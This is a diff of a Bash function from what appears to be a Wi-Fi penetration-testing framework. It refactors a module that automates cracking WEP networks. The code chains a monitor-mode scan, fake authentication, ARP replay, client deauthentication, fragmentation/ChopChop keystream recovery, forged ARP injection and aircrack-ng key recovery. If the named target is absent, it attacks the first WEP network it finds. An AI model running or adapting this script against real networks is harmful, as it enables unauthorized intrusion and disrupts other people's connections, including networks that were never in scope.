@@ -34,8 +34,35 @@
 set -uo pipefail
 
 run_d2() {
+    set -uo pipefail
+
+    local interface=""
+    local bssid=""
+    local ssid=""
+    local channel=""
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-.}}"
+
     local total_steps=7
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d2"
+    local evidence_prefix="${evidence_dir}/d2"
     local wep_scan_file="${evidence_prefix}_wep_scan.txt"
     local findings_file="${evidence_prefix}_findings.txt"
     local cracked_file="${evidence_prefix}_cracked_key.txt"
@@ -47,7 +74,7 @@ run_d2() {
 
     check_module_dependencies "D2" || return 1
 
-    if [[ -z "${GUEST_SSID:-}" ]]; then
+    if [[ -z "$ssid" ]]; then
         log_error "Target SSID not set. Run A1 first."
         return 1
     fi
@@ -58,6 +85,7 @@ run_d2() {
     log_step 2 $total_steps "Scanning for WEP-encrypted networks"
     update_tc_progress 2 $total_steps "WEP scan"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
@@ -74,9 +102,9 @@ run_d2() {
     rm -f "${scan_prefix}"* 2>/dev/null
 
     log_info "Running 30s scan for WEP networks..."
-    spawn_bg "wep_scan" "${TOOL_PATHS[airodump-ng]}" --encrypt WEP --write "$scan_prefix" --output-format csv "$mon_iface"
+    spawn_bg "d2_wep_scan" "airodump-ng" --encrypt WEP --write "$scan_prefix" --output-format csv "$mon_iface"
     sleep 30
-    stop_process "wep_scan"
+    stop_process "d2_wep_scan"
 
     local wep_networks_found=0
     local target_bssid=""
@@ -107,13 +135,13 @@ run_d2() {
 
             # Check if target SSID uses WEP
             local target_line
-            target_line=$(echo "$wep_lines" | grep -i "${GUEST_SSID}" | head -1 || true)
+            target_line=$(echo "$wep_lines" | grep -i "${ssid}" | head -1 || true)
 
             if [[ -n "$target_line" ]]; then
                 target_bssid=$(echo "$target_line" | awk -F, '{print $1}' | xargs)
                 target_channel=$(echo "$target_line" | awk -F, '{print $4}' | xargs)
-                target_ssid="$GUEST_SSID"
-                log_info "Target ${GUEST_SSID} uses WEP!"
+                target_ssid="$ssid"
+                log_info "Target ${ssid} uses WEP!"
             else
                 # Use first WEP network found
                 target_bssid=$(echo "$wep_lines" | head -1 | awk -F, '{print $1}' | xargs)
@@ -135,7 +163,7 @@ run_d2() {
         evidence_register_file "$wep_scan_file"
 
         local result_json
-        result_json=$(run_fg "jq" -n \
+        result_json=$(run_fg jq -n \
             --arg status "SECURE" \
             --arg summary "No WEP-encrypted networks detected in range." \
             --arg details "Passive scan completed, no WEP BSSIDs identified." \
@@ -164,7 +192,11 @@ run_d2() {
     echo "  ╚════════════════════════════════════════════════════════════════════╝"
     echo -e "${C_RESET}"
     echo ""
-    get_or_request_param "confirm" "  Proceed with WEP cracking? [Y/n]"
+    local confirm=""
+    stty echo 2>/dev/null
+    read -t 0.1 -n 10000 discard 2>/dev/null || true
+    printf "  Proceed with WEP cracking? [Y/n]: "
+    read confirm
     [[ "${confirm,,}" == "n" ]] && { disable_monitor_mode; return 1; }
 
     local ivs_collected=0
@@ -178,10 +210,10 @@ run_d2() {
     log_step 3 $total_steps "Authenticating to target AP"
     update_tc_progress 3 $total_steps "Fake auth"
 
-    iw dev "$mon_iface" set channel "$target_channel" 2>/dev/null || true
+    run_fg iw dev "$mon_iface" set channel "$target_channel" 2>/dev/null || true
 
     # Fake authentication to associate with the AP
-    run_fg "${TOOL_PATHS[aireplay-ng]}" --fakeauth 0 -a "$target_bssid" "$mon_iface"
+    run_fg aireplay-ng --fakeauth 0 -a "$target_bssid" "$mon_iface"
 
     sleep 2
     check_abort || return 1
@@ -193,7 +225,7 @@ run_d2() {
     rm -f "${capture_prefix}"* 2>/dev/null
 
     # Start airodump to capture IVs
-    spawn_bg "wep_dump" "${TOOL_PATHS[airodump-ng]}" --bssid "$target_bssid" \
+    spawn_bg "d2_wep_dump" "airodump-ng" --bssid "$target_bssid" \
         --channel "$target_channel" \
         --write "$capture_prefix" \
         --output-format pcap \
@@ -202,24 +234,24 @@ run_d2() {
     sleep 3
 
     # ARP replay attack — generates IVs rapidly
-    spawn_bg "wep_replay" "${TOOL_PATHS[aireplay-ng]}" --arpreplay -b "$target_bssid" "$mon_iface"
+    spawn_bg "d2_wep_replay" "aireplay-ng" --arpreplay -b "$target_bssid" "$mon_iface"
 
     # Also try deauth to stimulate ARP
-    run_fg "${TOOL_PATHS[aireplay-ng]}" --deauth 3 -a "$target_bssid" "$mon_iface"
+    run_fg aireplay-ng --deauth 3 -a "$target_bssid" "$mon_iface"
 
     start_countdown 120 "Collecting IVs via ARP replay (need ~20,000+ for crack)"
     sleep 120
     stop_countdown
 
     # Stop replay and capture
-    stop_process "wep_replay"
-    stop_process "wep_dump"
+    stop_process "d2_wep_replay"
+    stop_process "d2_wep_dump"
 
     # Count IVs collected
     local cap_file
     cap_file=$(ls "${capture_prefix}"*.cap 2>/dev/null | head -1)
     if [[ -n "$cap_file" && -s "$cap_file" ]]; then
-        ivs_collected=$(run_fg "${TOOL_PATHS[aircrack-ng]}" "$cap_file" 2>&1 | grep -oP '\d+ IVs' | grep -oP '\d+' | head -1) || ivs_collected=0
+        ivs_collected=$(run_fg aircrack-ng "$cap_file" 2>&1 | grep -oP '\d+ IVs' | grep -oP '\d+' | head -1) || ivs_collected=0
         log_info "Collected ${ivs_collected} IVs"
     fi
 
@@ -238,7 +270,7 @@ run_d2() {
         rm -f "$prga_file"
         
         # Use timeout as fragmentation/chopchop can hang or take long
-        timeout 60 "${TOOL_PATHS[aireplay-ng]}" --fragment \
+        timeout 60 run_fg aireplay-ng --fragment \
             -b "$target_bssid" \
             "$mon_iface" \
             -o "$prga_file" \
@@ -247,7 +279,7 @@ run_d2() {
         if [[ ! -f "$prga_file" ]]; then
             log_info "Fragmentation failed — trying ChopChop..."
             attack_method="chopchop"
-            timeout 60 "${TOOL_PATHS[aireplay-ng]}" --chopchop \
+            timeout 60 run_fg aireplay-ng --chopchop \
                 -b "$target_bssid" \
                 "$mon_iface" \
                 &>/dev/null || true
@@ -257,16 +289,16 @@ run_d2() {
         if [[ -f "$prga_file" ]]; then
             log_info "Got keystream — forging ARP packets..."
             local forged_arp="$TMP_DIR/d2_arp.cap"
-            run_fg "${TOOL_PATHS[packetforge-ng]}" -0 -a "$target_bssid" \
+            run_fg packetforge-ng -0 -a "$target_bssid" \
                     -h "$(run_tool ip link show "$mon_iface" | awk '/ether/{print $2}')" \
                     -l 255.255.255.255 -k 255.255.255.255 \
                     -y "$prga_file" \
                     -w "$forged_arp"
             
             if [[ -f "$forged_arp" ]]; then
-                 spawn_bg "wep_replay_forged" "${TOOL_PATHS[aireplay-ng]}" -r "$forged_arp" "$mon_iface"
+                 spawn_bg "d2_wep_replay_forged" "aireplay-ng" -r "$forged_arp" "$mon_iface"
                  sleep 30
-                 stop_process "wep_replay_forged"
+                 stop_process "d2_wep_replay_forged"
                  rm -f "$forged_arp"
             fi
         fi
@@ -281,7 +313,7 @@ run_d2() {
 
     if [[ -n "$cap_file" && -s "$cap_file" ]]; then
         local crack_output
-        crack_output=$(run_fg "${TOOL_PATHS[aircrack-ng]}" -b "$target_bssid" "$cap_file" 2>&1 || true)
+        crack_output=$(run_fg aircrack-ng -b "$target_bssid" "$cap_file" 2>&1 || true)
         echo "$crack_output" >> "$findings_file"
 
         # Check for cracked key
@@ -326,7 +358,7 @@ run_d2() {
     [[ -n "$cap_file" && -f "$cap_file" ]] && evidence_register_file "$cap_file"
 
     local result_json
-    result_json=$(run_fg "jq" -n \
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "WEP networks: ${wep_networks_found}, Target: ${target_bssid:-none}, IVs: ${ivs_collected}, Cracked: ${key_cracked}, Method: ${attack_method}" \
